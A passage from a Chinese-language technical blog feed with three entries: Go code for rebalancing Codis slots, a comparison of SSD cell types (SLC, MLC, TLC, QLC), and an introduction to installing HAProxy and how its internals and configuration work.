class="string">&quot;github.com/emirpasic/gods/trees/redblacktree&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Slot slot</span></span><br><span class="line"><span class="keyword">type</span> Slot <span class="keyword">struct</span> &#123;</span><br><span class="line">    ID      <span class="type">int</span></span><br><span class="line">    GroupID <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MaxSlotNum max</span></span><br><span class="line"><span class="keyword">var</span> MaxSlotNum = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// SlotsRebalance slots rebalance</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SlotsRebalance</span><span class="params">(groupIds []<span class="type">int</span>, slots []Slot)</span></span> (<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="comment">// 排序group</span></span><br><span class="line">    sort.Ints(groupIds)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        assigned = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>)</span><br><span class="line">        pendings = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">int</span>)</span><br><span class="line">        moveout  = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>)</span><br><span class="line">        docking  []<span class="type">int</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">var</span> groupSize = <span class="function"><span class="keyword">func</span><span class="params">(gid <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> assigned[gid] + <span class="built_in">len</span>(pendings[gid]) - moveout[gid]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lowerBound = MaxSlotNum / <span class="built_in">len</span>(groupIds)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按照每个Group可分配Slots的最大限制，统计Group中需要迁入/出的Slots信息</span></span><br><span class="line">    <span class="keyword">for</span> _, m := <span class="keyword">range</span> slots &#123;</span><br><span class="line">        <span class="keyword">if</span> m.GroupID != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> groupSize(m.GroupID) &lt; lowerBound &#123;</span><br><span class="line">                assigned[m.GroupID]++</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pendings[m.GroupID] = <span class="built_in">append</span>(pendings[m.GroupID], m.ID)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 依据现有的Group中Slots的数量构建红黑树</span></span><br><span class="line">    <span class="keyword">var</span> tree = rbtree.NewWith(<span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> gid1 = x.(<span class="type">int</span>)</span><br><span class="line">        <span class="keyword">var</span> gid2 = y.(<span class="type">int</span>)</span><br><span class="line">        <span class="keyword">if</span> gid1 != gid2 &#123;</span><br><span class="line">            <span class="keyword">if</span> d := groupSize(gid1) - groupSize(gid2); d != <span class="number">0</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> gid1 - gid2</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">for</span> _, gid := <span class="keyword">range</span> groupIds &#123;</span><br><span class="line">        tree.Put(gid, <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// fmt.Println(&quot;rbtree is &quot;, tree.String())</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 统计无主的slots</span></span><br><span class="line">    <span class="keyword">for</span> _, m := <span class="keyword">range</span> slots &#123;</span><br><span class="line">        <span class="keyword">if</span> m.GroupID != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        dest := tree.Left().Key.(<span class="type">int</span>)</span><br><span class="line">        tree.Remove(dest)</span><br><span class="line"></span><br><span class="line">        docking = <span class="built_in">append</span>(docking, m.ID)</span><br><span class="line">        moveout[dest]--</span><br><span class="line">        tree.Put(dest, <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每个group最大的slots数量</span></span><br><span class="line">    <span class="keyword">var</span> upperBound = (MaxSlotNum + <span class="built_in">len</span>(groupIds) - <span class="number">1</span>) / <span class="built_in">len</span>(groupIds)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 统计分配Slots</span></span><br><span class="line">    <span class="keyword">for</span> tree.Size() &gt;= <span class="number">2</span> &#123;</span><br><span class="line">        from := tree.Right().Key.(<span class="type">int</span>)</span><br><span class="line">        tree.Remove(from)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(pendings[from]) == moveout[from] &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        dest := tree.Left().Key.(<span class="type">int</span>)</span><br><span class="line">        tree.Remove(dest)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> (</span><br><span class="line">            fromSize = groupSize(from)</span><br><span class="line">            destSize = groupSize(dest)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> fromSize &lt;= lowerBound &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> destSize &gt;= upperBound &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> d := fromSize - destSize; d &lt;= <span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        moveout[from]++</span><br><span class="line">        moveout[dest]--</span><br><span class="line"></span><br><span class="line">        tree.Put(from, <span class="literal">nil</span>)</span><br><span class="line">        tree.Put(dest, <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> gid, n := <span class="keyword">range</span> moveout &#123;</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">0</span> &#123;</span><br><span class="line">            sids := pendings[gid]</span><br><span class="line">            sort.Sort(sort.Reverse(sort.IntSlice(sids)))</span><br><span class="line">            docking = <span class="built_in">append</span>(docking, sids[<span class="number">0</span>:n]...)</span><br><span class="line">            pendings[gid] = sids[n:]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">delete</span>(moveout, gid)</span><br><span class="line">    &#125;</span><br><span class="line">    sort.Ints(docking)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建迁移方案</span></span><br><span class="line">    <span class="keyword">var</span> plans = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>)</span><br><span class="line">    <span class="keyword">for</span> _, gid := <span class="keyword">range</span> groupIds &#123;</span><br><span class="line">        <span class="keyword">var</span> in = -moveout[gid]</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; in &amp;&amp; <span class="built_in">len</span>(docking) != <span class="number">0</span>; i++ &#123;</span><br><span class="line">            plans[docking[<span class="number">0</span>]] = gid</span><br><span class="line">            docking = docking[<span class="number">1</span>:]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plans, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    groupIds := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">    slots := <span class="built_in">make</span>([]Slot, MaxSlotNum)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> slots &#123;</span><br><span class="line">        slots[i].ID = i</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    plans, _ := SlotsRebalance(groupIds, slots[:<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> plans &#123;</span><br><span class="line">        slots[k].GroupID = v</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    groupIds = <span class="built_in">append</span>(groupIds, <span class="number">4</span>)</span><br><span class="line">    plans, _ = SlotsRebalance(groupIds, slots)</span><br><span class="line">    fmt.Println(plans)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Codis </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSD存储结构对比分析</title>
      <link href="/2020/02/01/ssd-storage-structure/"/>
      <url>/2020/02/01/ssd-storage-structure/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSD的存储单元包含如下几种：SLC、MLC、TLC和QLC，下面对比分析一下这几种存储颗粒的差异。</p><h2 id="二、SLC（Single-Level-Cell）"><a href="#二、SLC（Single-Level-Cell）" class="headerlink" title="二、SLC（Single-Level Cell）"></a>二、SLC（Single-Level Cell）</h2><p>每个<code>Cell</code>单元存储<code>1bit</code>信息，也就是只有<code>0</code>、<code>1</code>两种电压变化，结构简单，电压控制也快速；</p><h3 id="2-1、优缺点"><a href="#2-1、优缺点" class="headerlink" title="2.1、优缺点"></a>2.1、优缺点</h3><ul><li><p><strong>优点：</strong></p><ul><li>寿命长，性能强；</li><li>读写速度最快的NAND闪存芯片规格；</li><li>与任何其他类型的闪存相比，擦写寿命和读写循环的周期最长；</li><li>读取&#x2F;写入错误的发生几率更小，并可在跨度更大的温度范围内正常运行；</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>容量低，成本高；</li><li>市场上最昂贵的NAND闪存类型；</li><li>通常只有较小的容量；</li></ul></li></ul><h3 id="2-2、适用对象"><a href="#2-2、适用对象" class="headerlink" title="2.2、适用对象"></a>2.2、适用对象</h3><ul><li>需要大量读取&#x2F;写入周期的工业级负载，例如服务器；</li></ul><h2 id="三、MLC（Multi-Level-Cell）"><a href="#三、MLC（Multi-Level-Cell）" class="headerlink" title="三、MLC（Multi-Level Cell）"></a>三、MLC（Multi-Level Cell）</h2><p>每个<code>cell</code>单元存储<code>2bit</code>信息，需要更复杂的电压控制，有<code>00</code>，<code>01</code>，<code>10</code>，<code>11</code>四种变化，这也意味着写入性能、可靠性能降低了。其P&#x2F;E寿命根据不同制程在3000-5000次不等。</p><h3 id="3-1、优缺点"><a href="#3-1、优缺点" class="headerlink" title="3.1、优缺点"></a>3.1、优缺点</h3><ul><li><p><strong>优点：</strong></p><ul><li>扩展的SSD的容量，也拥有合理的性价比；</li><li>比TLC闪存表现更加稳定；</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>不如SLC闪存那般耐用可靠；</li></ul></li></ul><h3 id="3-2、适用对象"><a href="#3-2、适用对象" class="headerlink" title="3.2、适用对象"></a>3.2、适用对象</h3><ul><li>较频繁地使用计算机的用户或游戏玩家；</li></ul><h2 id="四、TLC（Trinary-Level-Cell）"><a href="#四、TLC（Trinary-Level-Cell）" class="headerlink" title="四、TLC（Trinary-Level Cell）"></a>四、TLC（Trinary-Level Cell）</h2><p>每个<code>cell</code>单元存储<code>3bit</code>信息，电压从<code>000</code>到<code>111</code>有8种变化，容量比<code>MLC</code>再次增加<code>1/3</code>，成本更低，但是架构更复杂，P&#x2F;E编程时间长，写入速度慢，P&#x2F;E寿命也降至1000-3000次，部分情况会更低。寿命短只是相对而言的，通常来讲，经过重度测试的TLC颗粒正常使用5年以上是没有问题的。</p><h3 id="4-1、优缺点"><a href="#4-1、优缺点" class="headerlink" title="4.1、优缺点"></a>4.1、优缺点</h3><ul><li><strong>优点：</strong><ul><li>较低的生产成本开启了廉价大容量SSD市场；</li></ul></li><li><strong>缺点：</strong><ul><li>与SLC、MLC相比，TLC储存单元的擦写寿命要短得多；</li><li>理论上读写速度与SLC、MLC相比较慢；</li></ul></li></ul><h3 id="4-2、适用对象"><a href="#4-2、适用对象" class="headerlink" title="4.2、适用对象"></a>4.2、适用对象</h3><ul><li>对存储需求不大的轻度使用需求的计算机用户，比如只使用上网、邮件等简单功能的上网本、平板；</li></ul><h2 id="五、QLC（4bit-MLC）"><a href="#五、QLC（4bit-MLC）" class="headerlink" title="五、QLC（4bit MLC）"></a>五、QLC（4bit MLC）</h2><p>电压有<code>16</code>种变化，但是容量能增加<code>33%</code>，就是写入性能、P&#x2F;E寿命与TLC相比会进一步降低。具体的性能测试上，美光有做过实验。读取速度方面，SATA接口中的二者都可以达到540MB&#x2F;S，QLC表现差在写入速度上，因为其P&#x2F;E编程时间就比MLC、TLC更长，速度更慢，连续写入速度从520MB&#x2F;s降至360MB&#x2F;s，随机性能更是从9500 IOPS降至5000 IOPS，损失将近一半。</p><h3 id="5-1、优缺点"><a href="#5-1、优缺点" class="headerlink" title="5.1、优缺点"></a>5.1、优缺点</h3><ul><li><strong>优点：</strong><ul><li>总成本更低，进行存储时依靠更少驱动器来实现；</li><li>具有更多容量，储存密度高，从而获得更好的效益；</li></ul></li><li><strong>缺点：</strong><ul><li>与SLC、MLC相比，QLC的性能和写入寿命有所降低，但与TLC相当；</li></ul></li></ul><h3 id="5-2、适用对象"><a href="#5-2、适用对象" class="headerlink" title="5.2、适用对象"></a>5.2、适用对象</h3><ul><li>比较适合把SSD作为数据仓库的用户；</li><li>对数据存储量的需求较大、平时对计算机进行轻度使用（写入操作少）、或者追求较低价格，建议选用；</li></ul><h2 id="六、性能对比"><a href="#六、性能对比" class="headerlink" title="六、性能对比"></a>六、性能对比</h2><p>在客观限制条件一致的前提下理论的对比数据以及存储单元结构如下所示；</p><table><thead><tr><th align="center">对比项目</th><th align="center">SLC</th><th align="center">MLC</th><th align="center">TLC</th><th align="center">QLC</th></tr></thead><tbody><tr><td align="center">读写性能</td><td align="center">最好</td><td align="center">好</td><td align="center">差</td><td align="center">最差</td></tr><tr><td align="center">价格</td><td align="center">最高</td><td align="center">高</td><td align="center">低</td><td align="center">最低</td></tr><tr><td align="center">存储空间</td><td align="center">最小</td><td align="center">小</td><td align="center">大</td><td align="center">最大</td></tr><tr><td align="center">擦写寿命</td><td align="center">最长</td><td align="center">长</td><td align="center">短</td><td align="center">最短</td></tr></tbody></table><p><img src="https://cdn.bugwz.com/ssd-storage-structure.png" alt="存储结构对比"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSD </tag>
            
            <tag> Hardware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HAProxy的学习与使用</title>
      <link href="/2020/01/01/haproxy/"/>
      <url>/2020/01/01/haproxy/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><a href="http://www.haproxy.org/">HAProxy</a> 是一个用于提供高可用、负载均衡以及基于四层和七层网络的代理软件，常使用于对性能要求较高，差错容忍度较低的场景。</p><h3 id="1-1、安装"><a href="#1-1、安装" class="headerlink" title="1.1、安装"></a>1.1、安装</h3><p>前往HAProxy的<a href="http://www.haproxy.org/">官网</a>，下载指定版本的源码包文件（当前的最新版本为<a href="http://www.haproxy.org/download/2.1/src/haproxy-2.1.2.tar.gz">2.1.2</a>）进行安装，其中<code>TARGET</code>后的具体参数依据系统的内核版本进行指定；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://www.haproxy.org/download/2.1/src/haproxy-2.1.2.tar.gz</span><br><span class="line">tar -zxvf haproxy-2.1.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> haproxy-2.1.2</span><br><span class="line">make TARGET=linux310</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="1-2、运行"><a href="#1-2、运行" class="headerlink" title="1.2、运行"></a>1.2、运行</h3><ul><li>创建配置文件：<ul><li>新建配置文件目录：<code>mkdir -p /etc/haproxy</code>；</li><li>复制配置文件模板：各类模板为源码包中的<code>./examples/*.cfg</code>文件，这里使用<code>./examples/socks4.cfg</code>文件，指令为：<code>cp ./examples/socks4.cfg /etc/haproxy/haproxy.cfg</code>；</li></ul></li><li>启动：<code>haproxy -f /etc/haproxy/haproxy.cfg</code>；</li></ul><h2 id="二、详细介绍"><a href="#二、详细介绍" class="headerlink" title="二、详细介绍"></a>二、详细介绍</h2><h3 id="2-1、调度管理"><a href="#2-1、调度管理" class="headerlink" title="2.1、调度管理"></a>2.1、调度管理</h3><p>HAProxy 的调度管理主要在<code>run_poll_loop</code>中循环实现。采用事件驱动模型显著降低了上下文切换的开销及内存占用，主循环的结构比较清晰，主循环的执行逻辑如下所示，相关代码如下所示：</p><ul><li>处理信号队列；</li><li>唤醒超时任务；</li><li>处理可运行的任务；</li><li>检测是否结束循环；</li><li>执行 poll 处理 fd 的 IO 事件；</li><li>处理可能仍有 IO 事件的 fd；</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 运行轮询循环 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">run_poll_loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> next, wake;</span><br><span class="line"></span><br><span class="line">tv_update_date(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">/* 处理一些任务 */</span></span><br><span class="line">process_runnable_tasks();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查我们是否捕获了一些信号并在第一个线程中对其进行处理 */</span></span><br><span class="line"><span class="keyword">if</span> (tid == <span class="number">0</span>)</span><br><span class="line">signal_process_queue();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查我们是否可以使某些任务过期 */</span></span><br><span class="line">next = wake_expired_tasks();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当无事可做时停止 */</span></span><br><span class="line"><span class="keyword">if</span> ((jobs - unstoppable_jobs) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果我们未能彻底停止所有任务，也将停止 */</span></span><br><span class="line"><span class="keyword">if</span> (killed &gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果事件处于等待中，则立即过期 */</span></span><br><span class="line">wake = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (thread_has_tasks())</span><br><span class="line">activity[tid].wake_tasks++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (signal_queue_len &amp;&amp; tid == <span class="number">0</span>)</span><br><span class="line">activity[tid].wake_signal++;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_HA_ATOMIC_OR(&amp;sleeping_thread_mask, tid_bit);</span><br><span class="line">__ha_barrier_atomic_store();</span><br><span class="line"><span class="keyword">if</span> ((global_tasks_mask &amp; tid_bit) || thread_has_tasks()) &#123;</span><br><span class="line">activity[tid].wake_tasks++;</span><br><span class="line">_HA_ATOMIC_AND(&amp;sleeping_thread_mask, ~tid_bit);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">wake = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 轮询程序将确保它在下一次循环前返回 */</span></span><br><span class="line">cur_poller.poll(&amp;cur_poller, next, wake);</span><br><span class="line"></span><br><span class="line">activity[tid].loops++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2、信号管理"><a href="#2-2、信号管理" class="headerlink" title="2.2、信号管理"></a>2.2、信号管理</h3><p>HAProxy 封装了自己的信号处理机制。接受到信号之后，将该信号放到信号队列中。<code>signal_register_fct</code>，<code>signal_register_task</code>接口提供了注册函数回调和任务类型回调两种方式。在程序运行到<code>signal_process_queue()</code>时处理所有位于信号队列中的信号。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 调用所有未决信号的处理程序，并清除计数和队列长度。</span></span><br><span class="line"><span class="comment"> * 处理程序可以在被调用时通过调用signal_register（）来注销自身，</span></span><br><span class="line"><span class="comment"> * 就像使用普通的信号处理程序一样。</span></span><br><span class="line"><span class="comment"> * 请注意，调用内联版本会更有效，该版本会在到达此处之前检查队列长度。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __signal_process_queue()</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> sig, cur_pos = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_descriptor</span> *<span class="title">desc</span>;</span></span><br><span class="line"><span class="type">sigset_t</span> old_sig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 处理期间阻止信号传递 */</span></span><br><span class="line">ha_sigmask(SIG_SETMASK, &amp;blocked_sig, &amp;old_sig);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 重要的是，我们向前扫描队列，这样我们就可以捕获将</span></span><br><span class="line"><span class="comment"> * 由另一个信号处理程序排队的任何信号。这允许真实的</span></span><br><span class="line"><span class="comment"> * 信号处理程序将信号重新分配给订阅了信号零的任务。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (cur_pos = <span class="number">0</span>; cur_pos &lt; signal_queue_len; cur_pos++) &#123;</span><br><span class="line">sig  = signal_queue[cur_pos];</span><br><span class="line">desc = &amp;signal_state[sig];</span><br><span class="line"><span class="keyword">if</span> (desc-&gt;count) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sig_handler</span> *<span class="title">sh</span>, *<span class="title">shb</span>;</span></span><br><span class="line">list_for_each_entry_safe(sh, shb, &amp;desc-&gt;handlers, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((sh-&gt;flags &amp; SIG_F_TYPE_FCT) &amp;&amp; sh-&gt;handler)</span><br><span class="line">((<span class="type">void</span> (*)(<span class="keyword">struct</span> sig_handler *))sh-&gt;handler)(sh);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sh-&gt;flags &amp; SIG_F_TYPE_TASK) &amp;&amp; sh-&gt;handler)</span><br><span class="line">task_wakeup(sh-&gt;handler, TASK_WOKEN_SIGNAL);</span><br><span class="line">&#125;</span><br><span class="line">desc-&gt;count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">signal_queue_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 恢复信号传递 */</span></span><br><span class="line">ha_sigmask(SIG_SETMASK, &amp;old_sig, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>信号注册时注册<code>SIG_F_TYPE_FCT</code>标识则直接调用信号回调处理；<code>SIG_F_TYPE_TASK</code>标识说明注册时回调函数是一个Task指针，这时需要唤醒Task，并指明任务状态为<code>TASK_WOKEN_SIGNAL</code>，此后对应处理函数将在Task管理下处理。</p><h4 id="2-2-1、优雅的重启信号"><a href="#2-2-1、优雅的重启信号" class="headerlink" title="2.2.1、优雅的重启信号"></a>2.2.1、优雅的重启信号</h4><p>为了能够进行优雅的重启，<code>wrapper</code>中守护<code>SIGUSR2</code>信号进行重启。</p><ul><li>尝试读取旧的Pids，如果存在旧的Pids，说明存在之前启动的相关进程；</li><li>启动时增加<code>-sf</code>选项，在进入新的<code>HAProxy</code>程序后会对向所有旧进程发出<code>SIGUSR1</code>信号；</li><li>旧的<code>HAProxy</code>程序捕获<code>SIGUSR1</code>执行对应回调<code>sig_soft_stop</code>优雅退出；</li></ul><h3 id="2-3、Task管理"><a href="#2-3、Task管理" class="headerlink" title="2.3、Task管理"></a>2.3、Task管理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有任务的基础 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task</span> &#123;</span></span><br><span class="line">TASK_COMMON;<span class="comment">/* 必须在开头！ */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eb32sc_node</span> <span class="title">rq</span>;</span><span class="comment">/* ebtree节点，用于将任务保存在运行队列中 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eb32_node</span> <span class="title">wq</span>;</span><span class="comment">/* ebtree节点，用于将任务保存在等待队列中 */</span></span><br><span class="line"><span class="type">int</span> expire;<span class="comment">/* 此任务的下一个到期日期，以时钟为单位 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> thread_mask;<span class="comment">/* 授权处理任务的线程ID的掩码 */</span></span><br><span class="line"><span class="type">uint64_t</span> call_date;<span class="comment">/* 最后一次任务唤醒或调用的日期 */</span></span><br><span class="line"><span class="type">uint64_t</span> lat_time;<span class="comment">/* 经历的总延迟时间 */</span></span><br><span class="line"><span class="type">uint64_t</span> cpu_time;              <span class="comment">/* 消耗的总CPU时间 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>HAProxy的调度最终都在Task内回调处理，为提升性能，Task的管理是采用<code>ebtree树形队列</code>方式，分为 <code>wait queue</code>和<code>run queue</code>：</p><ul><li><code>wait queue</code>：需要等待一定时间的task 的集合；</li><li><code>run queue</code>：需要立即执行的 task 的集合；</li></ul><p>使用wake_expired_tasks()函数以及process_runnable_tasks()函数来处理相关的操作：</p><ul><li><code>wake_expired_tasks()函数</code>：用来唤醒超时任务，检查<code>wait queue</code>中那些超时的任务，并将其放到<code>run queue</code>中；</li><li><code>process_runnable_tasks()函数</code>：处理位于<code>run queue</code>中的任务，对于TCP或者HTTP业务流量的处理，该函数最终通过调用 <code>process_session</code> 来完成，包括解析已经接收到的数据， 并执行一系列 load balance 的特性，但不负责从 socket 收发数据，数据收发由poll完成。同时，也会因为一些情况导致需要将当前的任务通过调用 <code>task_queue</code> 等接口放到 <code>wait queue</code> 中，实现上在任务回调处理时返回非空任务则会把任务重新加入<code>wait queue</code>；</li></ul><h3 id="2-4、配置相关"><a href="#2-4、配置相关" class="headerlink" title="2.4、配置相关"></a>2.4、配置相关</h3><p>HAProxy配置中分五大部分：</p><ul><li><p><code>global</code>：全局配置参数，属于进程级的配置，通常与操作系统的配置有关；</p></li><li><p><code>defaults</code>：配置一些默认的参数，可以被<code>frontend</code>，<code>backend</code>，<code>listen</code>段继承使用，如果<code>frontend</code>、<code>backend</code>、<code>listen</code>部分也配置了与<code>defaults</code>部分一样的参数，<code>defaults</code>部分参数对应的值自动被覆盖；</p></li><li><p><code>frontend</code>：接收请求的前端虚拟节点，用来匹配接收客户所请求的域名，uri等，并针对不同的匹配做不同的请求处理，可直接指定具体使用后端的<code>backend</code>（<code>1.3</code>版本之后引入）；</p></li><li><p><code>backend</code>：后端服务集群的配置，真实服务器，一个<code>backend</code>对应一个或者多个实体服务器（<code>1.3</code>版本之后引入）；</p></li><li><p><code>listen</code>：<code>frontend</code>和<code>backend</code>的组合体，在<code>1.3</code>版本之前，HAProxy的所有配置选项都在这个部分中设置，为了保持兼容性，新的版本依然保留了<code>listen</code>组件配置；</p></li></ul><h4 id="2-4-1、global配置"><a href="#2-4-1、global配置" class="headerlink" title="2.4.1、global配置"></a>2.4.1、global配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">global</span><br><span class="line">     <span class="built_in">log</span> 127.0.0.1 local0 info</span><br><span class="line">     uid 99</span><br><span class="line">     gid 99</span><br><span class="line">     daemon</span><br><span class="line">     nbproc 16</span><br><span class="line">     maxconn 4096</span><br><span class="line">     <span class="built_in">ulimit</span> -n 65536</span><br><span class="line">     pidfile /var/run/haproxy.pid</span><br></pre></td></tr></table></figure><ul><li><code>log</code>：日志输出设置；</li><li><code>uid</code>：运行的用户 uid；</li><li><code>gid</code>：运行的用户组gid；</li><li><code>daemon</code>：后台运行；</li><li><code>nbproc</code>：设置进程数量；</li><li><code>maxconn</code>：默认最大连接数；</li><li><code>ulimit -n</code>：设置最大打开的文件描述符数；</li><li><code>pidfile</code>：进程PID文件；</li></ul><h4 id="2-4-2、default配置"><a href="#2-4-2、default配置" class="headerlink" title="2.4.2、default配置"></a>2.4.2、default配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">defaults</span><br><span class="line">     mode http</span><br><span class="line">     <span class="built_in">log</span> 127.0.0.1 local3 err</span><br><span class="line">     retries 3</span><br><span class="line">     option httplog</span><br><span class="line">     option redispatch</span><br><span class="line">     option abortonclose</span><br><span class="line">     option dontlognull</span><br><span class="line">     <span class="built_in">timeout</span> connect 5000</span><br><span class="line">     <span class="built_in">timeout</span> client 3000</span><br><span class="line">     <span class="built_in">timeout</span> server 